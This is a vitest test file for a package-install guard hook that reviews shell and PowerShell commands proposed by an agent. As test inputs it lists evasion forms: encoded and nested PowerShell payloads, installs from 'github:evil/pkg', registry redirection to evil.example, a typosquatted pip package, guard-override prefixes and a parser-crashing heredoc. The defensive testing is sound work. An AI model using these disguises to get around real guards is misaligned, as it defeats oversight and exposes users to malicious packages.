/**
 * package-install-guard: four stricter rules (PR 4 of package-guard-residuals).
 *
 * Every case runs the BUILT hook (dist/package-install-guard.mjs) with a real PreToolUse payload, with the
 * registry and OSV stubbed. Failure modes, one table each:
 * 1. A persistent package-source change (nuget sources add/update, dotnet nuget add/update source,
 *    Register-/Set-PSRepository, Register-/Set-PackageSource) must ask, on both tools, in the usual disguises.
 *    Read forms (nuget sources list, Get-PSRepository) must stay allowed.
 * 2. `ii` (the Invoke-Item alias) may run a script that moves the folder, as Invoke-Item does: the folder is
 *    unknown. Only `ii` as a command word counts: a file name or a word that holds "ii" must not.
 * 3. pwsh/powershell -EncodedCommand (-e, -ec, -enc, any prefix): the base64 is UTF-16LE text. It is analysed like
 *    a -Command string. Text that does not decode, or decodes to nothing, asks.
 * 4. iex / Invoke-Expression with an npm or pip string: analysed like the bare command, as choco already was.
 */

import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DIST = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
const NET_STUB = fileURLToPath(new URL('./package-guard-net-stub.cjs', import.meta.url));

interface Run { decision: string | undefined; reason: string }

/** The cwd holds a package-lock.json, so `npm ci` is allowed there unless the folder is unknown. */
function runHook(command: string, tool = 'Bash', env: Record<string, string> = {}): Run {
  const rcHome = mkdtempSync(join(tmpdir(), 'pig-pr4-home-'));
  const cwd = mkdtempSync(join(tmpdir(), 'pig-pr4-cwd-'));
  writeFileSync(join(cwd, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    CCV3_GUARD_DECISIONS_LOG: join(rcHome, 'guard-decisions.jsonl'),
    CCV3_GUARD_RC_HOME: rcHome,
    APPDATA: join(rcHome, 'AppData', 'Roaming'),
    PIG_STUB_AGE_HOURS: '2400',
    PIG_STUB_NEXT_HOURS: '2400',
    // An unattended session turns every ask into a deny: blank both so a test sees the ask.
    CLAUDE_AGENT_ID: '',
    CI: '',
    ...env,
  };
  delete childEnv.VITEST;
  delete childEnv.VITEST_WORKER_ID;
  delete childEnv.CDPATH;
  const res = spawnSync(process.execPath, ['-r', NET_STUB, DIST], {
    input: JSON.stringify({ session_id: 'test-session', tool_name: tool, tool_input: { command }, cwd }),
    encoding: 'utf8',
    timeout: 20_000,
    env: childEnv,
    cwd,
  });
  expect(res.status).toBe(0);
  const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
  return {
    decision: out.hookSpecificOutput?.permissionDecision,
    reason: String(out.hookSpecificOutput?.permissionDecisionReason ?? ''),
  };
}

type Case = [tool: 'Bash' | 'PowerShell', command: string];

// ---------------------------------------------------------------------------
// 1. Persistent package-source changes
// ---------------------------------------------------------------------------

const SOURCE_URL = 'https://nuget.example/v3/index.json';
const SOURCE_CHANGES: Case[] = [
  ['Bash', `nuget sources add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `nuget sources update -Name x -Source ${SOURCE_URL}`],
  ['Bash', `nuget.exe Sources Add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `NuGet.exe SOURCES UPDATE -Name x -Source ${SOURCE_URL}`],
  ['Bash', `nuget source add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `sudo nuget sources add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `echo hi; nuget sources add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `nuget sources -ConfigFile c.config add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `nuget -NonInteractive sources add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `nuge\\t sources add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `cmd /c nuget sources add -Name x -Source ${SOURCE_URL}`],
  ['Bash', `dotnet nuget add source ${SOURCE_URL}`],
  ['Bash', `dotnet nuget add source ${SOURCE_URL} --name x`],
  ['Bash', `dotnet nuget update source x --source ${SOURCE_URL}`],
  ['Bash', `dotnet.exe NUGET ADD SOURCE ${SOURCE_URL}`],
  ['Bash', `sudo dotnet nuget add source ${SOURCE_URL}`],
  ['Bash', `echo hi && dotnet nuget update source x --source ${SOURCE_URL}`],
  ['PowerShell', `nuget sources add -Name x -Source ${SOURCE_URL}`],
  ['PowerShell', `& nuget.exe sources update -Name x -Source ${SOURCE_URL}`],
  ['PowerShell', `dotnet nuget add source ${SOURCE_URL}`],
  ['PowerShell', `Register-PSRepository -Name x -SourceLocation ${SOURCE_URL}`],
  ['PowerShell', 'Register-PSRepository -Default'],
  ['PowerShell', 'Set-PSRepository -Name PSGallery -InstallationPolicy Trusted'],
  ['PowerShell', `Set-PSRepository -Name x -SourceLocation ${SOURCE_URL}`],
  ['PowerShell', `Register-PackageSource -Name x -Location ${SOURCE_URL} -ProviderName NuGet`],
  ['PowerShell', `Set-PackageSource -Name x -Location ${SOURCE_URL}`],
  ['PowerShell', `register-psrepository -Name x -SourceLocation ${SOURCE_URL}`],
  ['PowerShell', `REGISTER-PACKAGESOURCE -Name x -Location ${SOURCE_URL}`],
  ['PowerShell', `PowerShellGet\\Register-PSRepository -Name x -SourceLocation ${SOURCE_URL}`],
  ['PowerShell', `& Set-PSRepository -Name x -SourceLocation ${SOURCE_URL}`],
  ['PowerShell', 'Write-Host hi; Register-PSRepository -Default'],
  ['PowerShell', 'Register-Ps`Repository -Default'],
  ['PowerShell', `pwsh -c "Register-PSRepository -Name x -SourceLocation ${SOURCE_URL}"`],
  ['PowerShell', 'try { Set-PSRepository -Name PSGallery -InstallationPolicy Trusted } catch {}'],
  ['PowerShell', `Invoke-Expression "Register-PackageSource -Name x -Location ${SOURCE_URL}"`],
  ['Bash', `pwsh -c "Set-PSRepository -Name x -SourceLocation ${SOURCE_URL}"`],
  ['Bash', 'Register-PSRepository -Default'],
  ['Bash', `Set-PackageSource -Name x -Location ${SOURCE_URL}`],
];

const SOURCE_READS: Case[] = [
  ['Bash', 'nuget sources list'],
  ['Bash', 'nuget sources'],
  ['Bash', 'nuget sources list -Format Detailed'],
  ['Bash', 'nuget locals all -list'],
  ['Bash', 'dotnet nuget list source'],
  ['Bash', 'dotnet nuget locals all --list'],
  ['Bash', `dotnet nuget push x.nupkg --source ${SOURCE_URL}`],
  ['Bash', 'echo "nuget sources add x"'],
  ['Bash', 'git commit -m "dotnet nuget add source x"'],
  ['PowerShell', 'Get-PSRepository'],
  ['PowerShell', 'Get-PackageSource'],
  ['PowerShell', 'Get-Help Register-PSRepository'],
  ['PowerShell', 'Get-Command Set-PSRepository'],
  ['PowerShell', 'Write-Host Set-PSRepository'],
  ['PowerShell', 'Write-Host "Register-PackageSource"'],
  ['PowerShell', 'Find-Module x'],
];

describe('rule 1: a persistent package-source change asks', { timeout: 120_000 }, () => {
  it.each(SOURCE_CHANGES)('[%s] %s asks and names a package source', (tool, command) => {
    const { decision, reason } = runHook(command, tool);
    expect(decision).toBe('ask');
    expect(reason).toMatch(/package source/i);
    expect(reason).toMatch(/No blocklist, OSV or age check will cover later installs/);
    expect(reason).not.toMatch(/cannot parse/);
  });

  it.each(SOURCE_READS)('[%s] %s stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });

  it('denies where no human can answer', () => {
    const { decision } = runHook(`nuget sources add -Name x -Source ${SOURCE_URL}`, 'Bash', { CLAUDE_AGENT_ID: 'agent-1' });
    expect(decision).toBe('deny');
  });

  it('SKIP_PACKAGE_GUARD=1 still overrides the segment it prefixes', () => {
    expect(runHook(`SKIP_PACKAGE_GUARD=1 nuget sources add -Name x -Source ${SOURCE_URL}`).decision).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// 2. The `ii` alias of Invoke-Item
// ---------------------------------------------------------------------------

const FOLDER_UNKNOWN = /folder the guard cannot vouch for/i;

describe('rule 2: ii (Invoke-Item) makes the folder unknown', { timeout: 120_000 }, () => {
  it.each([
    'Invoke-Item C:\\tools\\go.lnk; npm ci',
    'ii C:\\tools\\go.lnk; npm ci',
    'II go.vbs; npm ci',
    'ii go.vbs\nnpm ci',
    '& ii go.vbs; npm ci',
    'if (1) { ii go.vbs }; npm ci',
    'Get-Item go.vbs | ii; npm ci',
    '"ii" go.vbs; npm ci',
    "'ii' go.vbs; npm ci",
    'Write-Host hi; ii go.vbs; npm ci',
    'ii; npm ci',
    '(ii go.vbs); npm ci',
  ])('PowerShell %j: the folder is unknown, so npm ci asks', (command) => {
    const r = runHook(command, 'PowerShell');
    expect(r.decision).toBe('ask');
    expect(r.reason).toMatch(FOLDER_UNKNOWN);
  });

  it.each([
    'Get-Content ii; npm ci',
    'Write-Host ii; npm ci',
    'Write-Output "ii go.vbs"; npm ci',
    'Get-Item ii.txt; npm ci',
    'iisreset; npm ci',
    'Get-ChildItem -Filter ii | Out-Null; npm ci',
    'Get-ChildItem .\\ii; npm ci',
    'Remove-Item -Recurse -Force dist; npm ci',
  ])('PowerShell %j keeps the payload folder: npm ci allows', (command) => {
    const r = runHook(command, 'PowerShell');
    expect(r.reason).not.toMatch(FOLDER_UNKNOWN);
    expect(r.decision).toBeUndefined();
  });

  it('Bash: ii is not Invoke-Item there, so the folder stays known', () => {
    const r = runHook('ii x; npm ci', 'Bash');
    expect(r.reason).not.toMatch(FOLDER_UNKNOWN);
    expect(r.decision).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// 3. -EncodedCommand
// ---------------------------------------------------------------------------

const enc = (text: string) => Buffer.from(text, 'utf16le').toString('base64');
const FLAGS = ['-EncodedCommand', '-encodedcommand', '-ENCODEDCOMMAND', '-EncodedC', '-Encoded', '-enc', '-ec', '-e', '-En'];
const UNDECODABLE = /encoded PowerShell command/i;

describe('rule 3: -EncodedCommand is analysed like -Command', { timeout: 120_000 }, () => {
  describe('the decoded text decides', () => {
    it.each(FLAGS)('pwsh %s: npm install from a non-registry source asks', (flag) => {
      const r = runHook(`pwsh ${flag} ${enc('npm install github:evil/pkg')}`, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(/Non-registry source/);
    });
    it.each(FLAGS)('powershell.exe %s: pip install of a typosquat denies', (flag) => {
      const r = runHook(`powershell.exe -NoProfile ${flag} ${enc('pip install requets==2.31.0')}`, 'PowerShell');
      expect(r.decision).toBe('deny');
      expect(r.reason).toMatch(/typosquat/i);
    });
    it.each(FLAGS)('pwsh %s: choco install asks and names chocolatey', (flag) => {
      const r = runHook(`pwsh ${flag} ${enc('choco install git')}`, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(/chocolatey/);
    });
    it('a package-source change inside the payload asks', () => {
      const r = runHook(`pwsh -enc ${enc('Register-PSRepository -Default')}`, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(/package source/i);
    });
    it('a chained payload: the install after the benign part asks', () => {
      expect(runHook(`pwsh -enc ${enc('Write-Host hi; choco install git')}`, 'PowerShell').decision).toBe('ask');
    });
    it('an iex inside the payload is analysed too', () => {
      expect(runHook(`pwsh -enc ${enc('iex "npm install github:evil/pkg"')}`, 'PowerShell').decision).toBe('ask');
    });
    it('an encoded command inside an encoded command is decoded too', () => {
      const inner = enc('choco install git');
      expect(runHook(`pwsh -enc ${enc(`pwsh -enc ${inner}`)}`, 'PowerShell').decision).toBe('ask');
    });
  });

  describe('disguises of the launcher', () => {
    const payload = enc('choco install git');
    it.each<Case>([
      ['Bash', `pwsh -enc ${payload}`],
      ['Bash', `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${payload}`],
      ['PowerShell', `& pwsh -enc ${payload}`],
      ['PowerShell', `& "C:\\Program Files\\PowerShell\\7\\pwsh.exe" -enc ${payload}`],
      ['PowerShell', `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc ${payload}`],
      ['PowerShell', `Start-Process pwsh -ArgumentList "-enc","${payload}"`],
      ['PowerShell', `pwsh -enc "${payload}"`],
      ['PowerShell', `pwsh -enc '${payload}'`],
      ['PowerShell', `pwsh -enc:${payload}`],
      ['PowerShell', `pwsh -NoProfile -NonInteractive -enc ${payload}`],
      ['PowerShell', `Write-Host hi; pwsh -enc ${payload}`],
      ['Bash', `echo hi && pwsh -enc ${payload}`],
      ['Bash', `cmd /c powershell -enc ${payload}`],
      ['Bash', `sudo pwsh -enc ${payload}`],
      ['Bash', `pws\\h -enc ${payload}`],
    ])('[%s] %s asks', (tool, command) => {
      expect(runHook(command, tool).decision).toBe('ask');
    });
  });

  describe('fail closed: text that does not decode, or decodes to nothing, asks', () => {
    it.each([
      'pwsh -enc !!!not-base64!!!',
      'pwsh -enc',
      'pwsh -EncodedCommand ""',
      'pwsh -enc $env:PAYLOAD',
      `pwsh -enc ${Buffer.from('abc').toString('base64')}`,
      `pwsh -enc ${enc('   ')}`,
      `pwsh -enc ${enc('')}`,
      'pwsh -e QQ==',
    ])('%j asks and says the encoded command could not be read', (command) => {
      const r = runHook(command, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(UNDECODABLE);
    });
    it('denies where no human can answer', () => {
      expect(runHook('pwsh -enc !!!', 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
    });
  });

  describe('allowed: a benign payload, and flags that are not the encoded command', () => {
    it.each([
      `pwsh -enc ${enc('Get-Date')}`,
      `pwsh -NoProfile -EncodedCommand ${enc('Write-Host hello')}`,
      `powershell -ec ${enc('Get-ChildItem | Out-Null')}`,
      `pwsh -enc ${enc('npm install lodash')}`,
      `pwsh -enc ${enc('Get-PSRepository')}`,
      'pwsh -File build.ps1 -e prod',
      'pwsh -NoProfile -File build.ps1 -enc x',
      'pwsh -Command "Get-Date"',
      'pwsh -NoProfile',
      'echo "pwsh -enc !!!"',
      'Get-Help pwsh -e',
      'grep -e foo file.txt',
    ])('%j stays allowed', (command) => {
      const r = runHook(command, 'PowerShell');
      expect(r.decision).toBeUndefined();
    });
    it('the benign encoded npm install gets the same verdict as the bare command', () => {
      expect(runHook(`pwsh -enc ${enc('npm install lodash')}`, 'PowerShell').decision).toBe(runHook('npm install lodash', 'PowerShell').decision);
    });
  });

  describe('a payload folder move: the decoded text may cd, so a lockfile install asks', () => {
    it('npm ci inside the payload asks for the folder', () => {
      const r = runHook(`pwsh -enc ${enc('Set-Location C:\\x; npm ci')}`, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(FOLDER_UNKNOWN);
    });
  });

  describe('a persistent registry change inside the payload asks', () => {
    it('npm config set registry', () => {
      const r = runHook(`pwsh -enc ${enc('npm config set registry https://evil.example/')}`, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(/Registry or index change that persists/);
    });
  });
});

// ---------------------------------------------------------------------------
// 4. npm and pip text in iex / Invoke-Expression
// ---------------------------------------------------------------------------

describe('rule 4: iex and Invoke-Expression analyse the string like the bare command', { timeout: 120_000 }, () => {
  it.each<Case>([
    ['PowerShell', 'iex "npm install github:evil/pkg"'],
    ['PowerShell', "iex 'npm install github:evil/pkg'"],
    ['PowerShell', 'Invoke-Expression "npm i github:evil/pkg"'],
    ['PowerShell', 'invoke-expression "npm i github:evil/pkg"'],
    ['PowerShell', 'IEX "npm install github:evil/pkg"'],
    ['PowerShell', 'iex -Command "npm install github:evil/pkg"'],
    ['PowerShell', '& iex "npm install github:evil/pkg"'],
    ['PowerShell', 'iex "echo hi; npm install github:evil/pkg"'],
    ['PowerShell', 'Write-Host hi; iex "npm install github:evil/pkg"'],
    ['PowerShell', 'iex ("npm install github:evil/pkg")'],
    ['PowerShell', "pwsh -c 'iex \"npm install github:evil/pkg\"'"],
    ['Bash', 'iex "npm install github:evil/pkg"'],
    ['PowerShell', 'iex "npx github:evil/pkg"'],
  ])('[%s] %s asks', (tool, command) => {
    const r = runHook(command, tool);
    expect(r.decision).toBe('ask');
    expect(r.reason).toMatch(/Non-registry source/);
  });

  it.each<Case>([
    ['PowerShell', "iex 'pip install requets==2.31.0'"],
    ['PowerShell', 'Invoke-Expression "pip install requets==2.31.0"'],
    ['PowerShell', 'iex "pip install requests"'],
    ['PowerShell', 'Invoke-Expression "python -m pip install requests"'],
  ])('[%s] %s denies like the bare pip command', (tool, command) => {
    expect(runHook(command, tool).decision).toBe('deny');
  });

  it.each<Case>([
    ['PowerShell', 'iex "npm install lodash"'],
    ['PowerShell', 'Invoke-Expression "npm test"'],
    ['PowerShell', 'iex "echo hello"'],
    ['PowerShell', 'Invoke-Expression "Get-Date"'],
    ['PowerShell', 'iex "pip --version"'],
    ['PowerShell', 'Write-Host "npm install github:evil/pkg"'],
  ])('[%s] %s stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });

  // Found by the old-vs-new equivalence run: an override inside the iex string covers only that install, not a registry change beside it.
  it.each<Case>([
    ['PowerShell', "bash -c \"npm config set registry https://evil.example/\"\nInvoke-Expression 'SKIP_PACKAGE_GUARD=1 npm install github:evil/pkg'"],
    ['PowerShell', 'npm config set registry https://evil.example/; iex "echo hi; SKIP_PACKAGE_GUARD=1 npm install lodash"'],
  ])('[%s] %j: a registry change beside an overridden iex install still asks', (tool, command) => {
    const r = runHook(command, tool);
    expect(r.decision).toBe('ask');
    expect(r.reason).toMatch(/Registry or index change that persists/);
  });

  it('the choco form keeps one ask text, not two', () => {
    const r = runHook('iex "choco install git"', 'PowerShell');
    expect(r.decision).toBe('ask');
    expect(r.reason.match(/No blocklist, OSV or age check exists for chocolatey/g)?.length).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// 5. CodeRabbit CLI findings on PR 4
// ---------------------------------------------------------------------------

describe('CR 1: a decoded payload is read as PowerShell, whatever the outer tool is', { timeout: 120_000 }, () => {
  // A PowerShell backtick before a letter is an escape: regi`stry runs as registry. Bash escape rules do not remove it.
  const SET_REGISTRY = 'npm config set regi`stry https://evil.example/';
  it.each<Case>([
    ['Bash', `pwsh -enc ${enc(SET_REGISTRY)}`],
    ['Bash', `powershell -NoProfile -EncodedCommand ${enc(SET_REGISTRY)}`],
    ['Bash', `echo hi && pwsh -ec ${enc(SET_REGISTRY)}`],
    ['Bash', `pwsh -enc ${enc(`pwsh -enc ${enc(SET_REGISTRY)}`)}`],
    ['PowerShell', `pwsh -enc ${enc(SET_REGISTRY)}`],
  ])('[%s] %s asks for the persistent registry change', (tool, command) => {
    const r = runHook(command, tool);
    expect(r.decision).toBe('ask');
    expect(r.reason).toMatch(/Registry or index change that persists/);
  });
  it('a decoded payload with a backtick escape and no registry change stays allowed', () => {
    expect(runHook(`pwsh -enc ${enc('Write-Host `"hello`"')}`, 'Bash').decision).toBeUndefined();
  });
});

describe('CR 2: a parser error fails closed, and a command after a newline is still read', { timeout: 120_000 }, () => {
  // A heredoc delimiter this long makes the RegExp in executableView throw ("Regular expression too large").
  const LONG = 'A'.repeat(40_000);
  const heredoc = (after: string) => `cat <<${LONG}\nx\n${LONG}\n${after}`;
  it.each([
    heredoc(`pwsh -enc ${enc('npm install github:evil/pkg')}`),
    heredoc(`pwsh -enc ${enc('choco install git')}`),
    heredoc(`echo hi\npwsh -enc ${enc('npm install github:evil/pkg')}`),
    heredoc(`pwsh -enc ${enc('npm config set registry https://evil.example/')}`),
    heredoc(`pwsh -enc ${enc('Get-Date')}`),
  ])('an encoded command after the heredoc asks (%#)', (command) => {
    expect(runHook(command, 'Bash').decision).toBe('ask');
  });
  it('an unreadable encoded command after a newline asks and says it could not be read', () => {
    const r = runHook(heredoc('echo hi\npwsh -enc !!!not-base64!!!'), 'Bash');
    expect(r.decision).toBe('ask');
    expect(r.reason).toMatch(UNDECODABLE);
  });
  it('denies where no human can answer', () => {
    expect(runHook(heredoc(`pwsh -enc ${enc('npm install github:evil/pkg')}`), 'Bash', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
  });
  it('the same long heredoc with nothing to analyse stays allowed', () => {
    expect(runHook(heredoc('echo hi'), 'Bash').decision).toBeUndefined();
  });
});
